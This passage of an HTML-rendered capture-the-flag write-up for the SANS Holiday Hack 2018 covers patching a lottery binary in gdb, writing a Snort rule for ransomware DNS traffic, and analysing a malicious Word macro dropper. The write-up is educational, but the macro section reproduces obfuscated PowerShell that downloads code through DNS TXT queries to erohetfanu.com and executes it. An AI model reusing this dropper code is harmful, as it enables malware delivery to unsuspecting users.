&lt;span class="go"&gt;   0x000000000000154f &amp;lt;+133&amp;gt;:   lea    0x5856(%rip),%rdi        # 0x6dac&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001556 &amp;lt;+140&amp;gt;:   mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000155b &amp;lt;+145&amp;gt;:   callq  0x8f0 &amp;lt;printf@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001560 &amp;lt;+150&amp;gt;:   mov    -0x4(%rbp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001563 &amp;lt;+153&amp;gt;:   mov    %eax,%esi&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001565 &amp;lt;+155&amp;gt;:   lea    0x5858(%rip),%rdi        # 0x6dc4&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000156c &amp;lt;+162&amp;gt;:   mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001571 &amp;lt;+167&amp;gt;:   callq  0x8f0 &amp;lt;printf@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001576 &amp;lt;+172&amp;gt;:   lea    0x584a(%rip),%rdi        # 0x6dc7&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000157d &amp;lt;+179&amp;gt;:   callq  0x910 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;   0x0000000000001582 &amp;lt;+184&amp;gt;:   cmpl   $0x4c9,-0x4(%rbp)&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;   0x0000000000001589 &amp;lt;+191&amp;gt;:   jne    0x1597 &amp;lt;main+205&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000158b &amp;lt;+193&amp;gt;:   mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001590 &amp;lt;+198&amp;gt;:   callq  0xfd7 &amp;lt;winnerwinner&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001595 &amp;lt;+203&amp;gt;:   jmp    0x15a1 &amp;lt;main+215&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001597 &amp;lt;+205&amp;gt;:   mov    $0x0,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000159c &amp;lt;+210&amp;gt;:   callq  0x14b7 &amp;lt;sorry&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000015a1 &amp;lt;+215&amp;gt;:   mov    $0x0,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000015a6 &amp;lt;+220&amp;gt;:   callq  0x920 &amp;lt;exit@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;At the highlighted line, we can see that the value of &lt;code&gt;$rbp - 0x4&lt;/code&gt; is
compared to 0x4c9. This hex value in decimal is 1225, which is the winning
value of the lottery. So this is the comparison that is made between the
winning ticket and our randomly drawn ticket. If they're different, the
program jumps to &lt;code&gt;main+205&lt;/code&gt; and calls the function &lt;code&gt;sorry&lt;/code&gt;. If
they're equal, it continues and calls &lt;code&gt;winnerwinner&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let's put a breakpoint on this comparison, and run the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) b *(main+184)&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x1582&lt;/span&gt;
&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /home/elf/sleighbell-lotto&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.&lt;/span&gt;

&lt;span class="go"&gt;The winning ticket is number 1225.&lt;/span&gt;
&lt;span class="go"&gt;Rolling the tumblers to see what number you&amp;#39;ll draw...&lt;/span&gt;

&lt;span class="go"&gt;You drew ticket number 8093!&lt;/span&gt;


&lt;span class="go"&gt;Breakpoint 1, 0x0000555555555582 in main ()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we're just before the comparison of our (losing) ticket to 1225. Several
options are available. We can directly jump to the call of
&lt;code&gt;winnerwinner&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) j *(main+198)&lt;/span&gt;
&lt;span class="go"&gt;Continuing at 0x555555555590.&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;Congratulations! You&amp;#39;ve won, and have successfully completed this challenge.&lt;/span&gt;
&lt;span class="go"&gt;[Inferior 1 (process 46) exited normally]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can also directly modify the memory, so that our ticket has the winning
value:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) x/d ($rbp-0x4)&lt;/span&gt;
&lt;span class="go"&gt;0x7fffffffe5fc: 8093&lt;/span&gt;
&lt;span class="go"&gt;(gdb) set *((int *) ($rbp-0x4)) = 1225&lt;/span&gt;
&lt;span class="go"&gt;(gdb) continue&lt;/span&gt;
&lt;span class="go"&gt;Continuing.&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;Congratulations! You&amp;#39;ve won, and have successfully completed this challenge.&lt;/span&gt;
&lt;span class="go"&gt;[Inferior 1 (process 40) exited normally]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I'm sure there are many more ways to win this lottery, and look forward to read
about them in other write-ups!&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="snort-rule"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id40"&gt;Snort Rule&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;In Santa's secret room, we find Alabaster, who is in need of help:&lt;/p&gt;
&lt;img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" /&gt;
&lt;p&gt;&lt;em&gt;Alabaster says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Help, all of our computers have been encrypted by ransomware!&lt;/p&gt;
&lt;p&gt;I came here to help but got locked in 'cause I dropped my &amp;quot;Alabaster
Snowball&amp;quot; badge in a rush.&lt;/p&gt;
&lt;p&gt;I started analyzing the ransomware on my host operating system, ran it by
accident, and now my files are encrypted!&lt;/p&gt;
&lt;p&gt;Unfortunately, the password database I keep on my computer was encrypted,
so now I don't have access to any of our systems.&lt;/p&gt;
&lt;p&gt;If only there were some way I could create some kind of traffic filter that
could alert anytime ransomware was found!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we must stop the ransomware traffic, using the Snort terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;  _  __     _             _       _____          _   _&lt;/span&gt;
&lt;span class="go"&gt; | |/ /    (_)           | |     / ____|        | | | |&lt;/span&gt;
&lt;span class="go"&gt; | &amp;#39; / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___&lt;/span&gt;
&lt;span class="go"&gt; |  &amp;lt; | &amp;#39;__| | &amp;#39;_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \&lt;/span&gt;
&lt;span class="go"&gt; | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/&lt;/span&gt;
&lt;span class="go"&gt; |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|&lt;/span&gt;
&lt;span class="go"&gt;             / ____| __/ |          | |&lt;/span&gt;
&lt;span class="go"&gt;            | (___  |___/  ___  _ __| |_&lt;/span&gt;
&lt;span class="go"&gt;             \___ \| &amp;#39;_ \ / _ \| &amp;#39;__| __|&lt;/span&gt;
&lt;span class="go"&gt;             ____) | | | | (_) | |  | |_&lt;/span&gt;
&lt;span class="go"&gt;            |_____/|_|_|_|\___/|_|_  \__|&lt;/span&gt;
&lt;span class="go"&gt;               |_   _|  __ \ / ____|&lt;/span&gt;
&lt;span class="go"&gt;                 | | | |  | | (___&lt;/span&gt;
&lt;span class="go"&gt;         _____   | | | |  | |\___ \        __&lt;/span&gt;
&lt;span class="go"&gt;        / ____| _| |_| |__| |____) |      /_ |&lt;/span&gt;
&lt;span class="go"&gt;       | (___  |_____|_____/|_____/ _ __   | |&lt;/span&gt;
&lt;span class="go"&gt;        \___ \ / _ \ &amp;#39;_ \/ __|/ _ \| &amp;#39;__|  | |&lt;/span&gt;
&lt;span class="go"&gt;        ____) |  __/ | | \__ \ (_) | |     | |&lt;/span&gt;
&lt;span class="go"&gt;       |_____/ \___|_| |_|___/\___/|_|     |_|&lt;/span&gt;
&lt;span class="go"&gt;============================================================&lt;/span&gt;
&lt;span class="go"&gt;INTRO:&lt;/span&gt;
&lt;span class="go"&gt;  Kringle Castle is currently under attacked by new piece of&lt;/span&gt;
&lt;span class="go"&gt;  ransomware that is encrypting all the elves files. Your&lt;/span&gt;
&lt;span class="go"&gt;  job is to configure snort to alert on ONLY the bad&lt;/span&gt;
&lt;span class="go"&gt;  ransomware traffic.&lt;/span&gt;
&lt;span class="go"&gt;GOAL:&lt;/span&gt;
&lt;span class="go"&gt;  Create a snort rule that will alert ONLY on bad ransomware&lt;/span&gt;
&lt;span class="go"&gt;  traffic by adding it to snorts /etc/snort/rules/local.rules&lt;/span&gt;
&lt;span class="go"&gt;  file. DNS traffic is constantly updated to snort.log.pcap&lt;/span&gt;
&lt;span class="go"&gt;COMPLETION:&lt;/span&gt;
&lt;span class="go"&gt;  Successfully create a snort rule that matches ONLY&lt;/span&gt;
&lt;span class="go"&gt;  bad DNS traffic and NOT legitimate user traffic and the&lt;/span&gt;
&lt;span class="go"&gt;  system will notify you of your success.&lt;/span&gt;

&lt;span class="go"&gt;  Check out ~/more_info.txt for additional information.&lt;/span&gt;
&lt;span class="gp"&gt;elf@4a4351a6045e:~$&lt;/span&gt; cat more_info.txt
&lt;span class="go"&gt;MORE INFO:&lt;/span&gt;
&lt;span class="go"&gt;  A full capture of DNS traffic for the last 30 seconds is&lt;/span&gt;
&lt;span class="go"&gt;  constantly updated to:&lt;/span&gt;
&lt;span class="go"&gt;  /home/elf/snort.log.pcap&lt;/span&gt;
&lt;span class="go"&gt;  You can also test your snort rule by running:&lt;/span&gt;
&lt;span class="go"&gt;  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf&lt;/span&gt;
&lt;span class="go"&gt;  This will create an alert file at ~/snort_logs/alert&lt;/span&gt;
&lt;span class="go"&gt;  This sensor also hosts an nginx web server to access the&lt;/span&gt;
&lt;span class="go"&gt;  last 5 minutes worth of pcaps for offline analysis. These&lt;/span&gt;
&lt;span class="go"&gt;  can be viewed by logging into:&lt;/span&gt;
&lt;span class="go"&gt;  http://snortsensor1.kringlecastle.com/&lt;/span&gt;
&lt;span class="go"&gt;  Using the credentials:&lt;/span&gt;
&lt;span class="go"&gt;  ----------------------&lt;/span&gt;
&lt;span class="go"&gt;  Username | elf&lt;/span&gt;
&lt;span class="go"&gt;  Password | onashelf&lt;/span&gt;
&lt;span class="go"&gt;  tshark and tcpdump have also been provided on this sensor.&lt;/span&gt;
&lt;span class="go"&gt;HINT:&lt;/span&gt;
&lt;span class="go"&gt;  Malware authors often user dynamic domain names and&lt;/span&gt;
&lt;span class="go"&gt;  IP addresses that change frequently within minutes or even&lt;/span&gt;
&lt;span class="go"&gt;  seconds to make detecting and block malware more difficult.&lt;/span&gt;
&lt;span class="go"&gt;  As such, its a good idea to analyze traffic to find patterns&lt;/span&gt;
&lt;span class="go"&gt;  and match upon these patterns instead of just IP/domains.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We must create a rule that will match all the ransomware's traffic, and won't
match the legitimate users' traffic. We're given access to a website which
contains PCAP files with the DNS traffic of the last five minutes.&lt;/p&gt;
&lt;p&gt;Let's download some of these PCAP files and see if we can find a common
pattern.  You can use KringleCastle's website, mentioned herebefore, or you can
download some of the PCAP files I had during the challenge:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631032.853224.pcap"&gt;snort.log.1546631032.853224.pcap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631066.7843747.pcap"&gt;snort.log.1546631066.7843747.pcap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631107.349513.pcap"&gt;snort.log.1546631107.349513.pcap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we open these PCAP files, we see exclusively TXT DNS traffic. However, you
notice rapidly that some of these domains don't seem legitimate. Some of the
requests made interrogate a weird looking domain, with some sort of hash as a
part of the subdomain, and the TXT answers are extremely long. This is clearly
very fishy, and we can easily guess that this is our ransomware traffic.&lt;/p&gt;
&lt;p&gt;However, we can't use the source IP address, the destination IP address, or the
domain name as &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Indicator_of_compromise"&gt;IOCs&lt;/a&gt;,
because they never stay the same. The only constant seems to be this hash,
&lt;code&gt;77616E6E61636F6F6B69652E6D696E2E707331&lt;/code&gt;, which is part of the subdomain.&lt;/p&gt;
&lt;p&gt;Let's create a Snort rule that will trigger an alert every time we see this
hash. I used &lt;a class="reference external" href="https://resources.infosecinstitute.com/snort-rules-workshop-part-one/"&gt;this website&lt;/a&gt;
and StackOverflow to determine how to do so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alert udp any any -&amp;gt; any any (msg:&amp;quot;Ransomware trafic detected&amp;quot;; pcre:&amp;quot;/77616E6E61636F6F6B69652E6D696E2E707331/&amp;quot;; metadata:service dns; sid:1337; rev:3;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here's what it means:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;alert&lt;/code&gt;: create an alert when this rule matches&lt;/li&gt;
&lt;li&gt;&lt;code&gt;udp&lt;/code&gt;: we only care about UDP traffic&lt;/li&gt;
&lt;li&gt;&lt;code&gt;any any -&amp;gt; any any&lt;/code&gt;: we look at traffic from any source to any
destination. I tried to do some fine tuning here, but I didn't catch every
traffic, only the requests made by the ransomware (and not the answers from
the server). This is likely overkill and wouldn't work in a true production
environment.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msg&lt;/code&gt;: the message that will be displayed in our alert&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pcre:&amp;quot;/77616E6E61636F6F6B69652E6D696E2E707331/&amp;quot;&lt;/code&gt;: our alert will only
be triggered if it matches this regex. Here, it's a pretty simple regex that
only looks if the IOC hash is in the traffic.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;metadata&lt;/code&gt;: the UDP traffic is DNS&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sid&lt;/code&gt;, &lt;code&gt;rev&lt;/code&gt;: id and revision number of the rule&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's add this rule at the end of our rule file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7a674ac839a9:~$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;\nalert udp any any -&amp;gt; any any (msg:&amp;quot;Ransomware trafic detected&amp;quot;; pcre:&amp;quot;/77616E6E61636F6F6B69652E6D696E2E707331/&amp;quot;; metadata:service dns; sid:1337; rev:3;)&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/snort/rules/local.rules
&lt;span class="gp"&gt;elf@7a674ac839a9:~$&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we now have an alert every time the ransomware generates traffic.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="malware-dropper"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id41"&gt;Malware Dropper&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Now that the ransomware traffic is stopped, Alabaster gives us an archive,
which, he supposes, is the initial dropper for the ransomware. We must find
the domain it communicates with.&lt;/p&gt;
&lt;img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" /&gt;
&lt;p&gt;&lt;em&gt;Alabaster says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you so much! Snort IDS is alerting on each new ransomware infection
in our network.&lt;/p&gt;
&lt;p&gt;Hey, you're pretty good at this security stuff. Could you help me further
with what I suspect is a malicious Word document?&lt;/p&gt;
&lt;p&gt;All the elves were emailed a cookie recipe right before all the infections.
Take &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/CHOCOLATE_CHIP_COOKIE_RECIPE.zip"&gt;this document&lt;/a&gt;
with a password of &lt;strong&gt;elves&lt;/strong&gt; and find the domain it communicates with.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, let's extract this archive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; 7z -pelves x CHOCOLATE_CHIP_COOKIE_RECIPE.zip

&lt;span class="go"&gt;7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21&lt;/span&gt;
&lt;span class="go"&gt;p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)&lt;/span&gt;

&lt;span class="go"&gt;Scanning the drive for archives:&lt;/span&gt;
&lt;span class="go"&gt;1 file, 110699 bytes (109 KiB)&lt;/span&gt;

&lt;span class="go"&gt;Extracting archive: CHOCOLATE_CHIP_COOKIE_RECIPE.zip&lt;/span&gt;
&lt;span class="go"&gt;--&lt;/span&gt;
&lt;span class="go"&gt;Path = CHOCOLATE_CHIP_COOKIE_RECIPE.zip&lt;/span&gt;
&lt;span class="go"&gt;Type = zip&lt;/span&gt;
&lt;span class="go"&gt;Physical Size = 110699&lt;/span&gt;

&lt;span class="go"&gt;Everything is Ok&lt;/span&gt;

&lt;span class="go"&gt;Size:       113540&lt;/span&gt;
&lt;span class="go"&gt;Compressed: 110699&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;  ls -lh
&lt;span class="go"&gt;total 228K&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-rw-r--r-- 1 useless useless 111K déc.  17 18:46 CHOCOLATE_CHIP_COOKIE_RECIPE.docm&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;-rw-r--r-- 1 useless useless 109K déc.  18 04:17 CHOCOLATE_CHIP_COOKIE_RECIPE.zip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, it's a &lt;code&gt;.docm&lt;/code&gt; file. This is probably a Microsoft Office file
with a malicious macro that will download and execute the malware. Let's open
it &lt;strong&gt;with extra care not to execute the macro&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;For those of you who only want the chocolate chip cookie recipe, you can find
it &lt;a class="reference external" href="#appendix-chocolate-chip-cookie-recipe"&gt;in the appendix&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If we take a look at the macros in this Office file, we can see that two
functions, &lt;code&gt;Document_Open&lt;/code&gt; and &lt;code&gt;AutoOpen&lt;/code&gt; were created:&lt;/p&gt;
&lt;img alt="libreoffice_macro_docm.png" class="align-center" src="/images/sans-christmas-challenge-2018/libreoffice_macro_docm.png" /&gt;
&lt;p&gt;&lt;em&gt;(Yes, it's LibreOffice, sue me)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;These functions are designed to be executed as soon as the document is open.
Let's take a look at the source code of these functions:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
Dim cmd As String
&lt;span class="hll"&gt;cmd = &amp;quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &amp;quot;&amp;quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&amp;#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&amp;#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&amp;quot;&amp;quot; &amp;quot;
&lt;/span&gt;Shell cmd
End Sub
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As soon as the document gets opened, a (quite ugly) PowerShell command is
executed. We can see from the source code that there is some base64-encoding,
and some compressing. Instead of doing the analysis manually, we'll use
PowerShell to execute the command. &lt;strong&gt;But&lt;/strong&gt; in order &lt;strong&gt;not to get infected
ourselves&lt;/strong&gt;, we'll replace every occurrence of &lt;code&gt;IEX&lt;/code&gt; (or
&lt;code&gt;Invoke-Expression&lt;/code&gt;) by a &lt;code&gt;Write-Output&lt;/code&gt;. This way, the source
code will be displayed instead of being executed.&lt;/p&gt;
&lt;p&gt;So, let's see what this PowerShell gibberish means:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS C:\Users\admin&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;sal&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;Write-Output&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StreamReader&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Compression&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DeflateStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[IO.MemoryStream][Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="no"&gt;[IO.Compression.CompressionMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Decompress&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;&lt;span class="no"&gt;[Text.Encoding]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;function H2A($a) {$o; $a -split &amp;#39;(..)&amp;#39; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &amp;quot;77616E6E61636F6F6B69652E6D696E2E707331&amp;quot;; $h = &amp;quot;&amp;quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &amp;quot;$f.erohetfanu.com&amp;quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &amp;quot;$i.$f.erohetfanu.com&amp;quot; -Type TXT).strings}; iex($(H2A $h | Out-string))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we get a weird function, &lt;code&gt;H2A&lt;/code&gt;, which is making DNS request to
a domain name &lt;code&gt;erohetfanu.com&lt;/code&gt;. That's the domain we're looking for.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="malware-analysis"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id42"&gt;Malware Analysis&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Alabaster wonders if the malware uses a killswitch domain, &lt;em&gt;à la WannaCry&lt;/em&gt;.&lt;/p&gt;
&lt;img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" /&gt;
&lt;p&gt;&lt;em&gt;Alabaster says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Erohetfanu.com, I wonder what that means?&lt;/p&gt;
&lt;p&gt;Unfortunately, Snort alerts show multiple domains, so blocking that one
won't be effective.&lt;/p&gt;
&lt;p&gt;I remember another ransomware in recent history had a killswitch domain
that, when registered, would prevent any further infections.&lt;/p&gt;
&lt;p&gt;Perhaps there is a mechanism like that in this ransomware? Do some more
analysis and see if you can find a fatal flaw and activate it!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let's analyze the ransomware and see what we can find. First of all, let's
get the source code of the malware. Let's execute the command we found in the
previous question, &lt;strong&gt;without&lt;/strong&gt; executing &lt;code&gt;IEX&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;PS E:\sans-christmas-challenge-2018&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;H2A&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$o&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="n"&gt;-split&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;(..)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;forEach&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="no"&gt;[char]&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;toint16&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;forEach&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$o&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$o&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$o&lt;/span&gt;&lt;span 